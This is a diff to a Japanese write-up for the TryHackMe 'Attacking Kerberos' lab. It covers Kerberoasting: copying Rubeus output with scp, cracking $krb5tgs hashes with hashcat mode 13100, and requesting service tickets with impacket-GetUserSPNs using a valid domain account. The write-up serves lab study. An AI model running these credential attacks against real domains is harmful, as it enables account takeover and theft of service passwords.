@@ -159,5 +159,5 @@ What is the SQLService Password?
 「`scp SSHユーザ名@IPアドレス:/リモートパス ローカルパス`」でRubeus出力を取得し  
 「`hashcat -a 0 -m 13100 ハッシュファイル名 Wordlist名`」でハッシュをクラック。（`-m 13100`は`$krb5tgs`形式のHash形式、Johnだとこの形式をサポートしていなかった。）
 
-ちなみに「`impacket-GetUserSPNs`」
+ちなみに「`impacket-GetUserSPNs ドメイン名/ユーザ名:パスワード -dc-ip IPアドレス -outputfile 出力ファイル`」で、有効なドメインユーザを使用してチケットを取得できる。
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_13.png" width="100%" height="100%">  
